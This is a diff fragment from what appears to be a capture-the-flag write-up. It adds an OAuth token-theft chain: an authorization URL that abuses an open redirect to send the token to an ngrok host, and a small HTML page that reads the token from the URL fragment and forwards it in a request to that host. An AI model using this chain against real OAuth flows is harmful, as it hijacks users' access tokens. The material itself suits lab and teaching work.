@@ -41,3 +41,24 @@ curl 'https://69xknhzf.eu1.ctfio.com/settings' --compressed -X POST -H 'Cookie: 
 ```js
 document.location.hash.substr(1)
 ```
+
+```
+https://auth.fluorite.ctfio.com/auth?client_id=1&redirect_url=https://fluorite.ctfio.com/redirect?url=https://e949-83-213-97-233.ngrok-free.app/test.html/&response_type=token
+```
+
+```html
+<html>
+<head>
+<title>Hello World :-)</title>
+</head>
+<body>
+
+Hello World :-)
+<script>
+window.location = 'x/'+document.location.hash.substr(1)
+</script>
+
+</body>
+</html>
+```
+
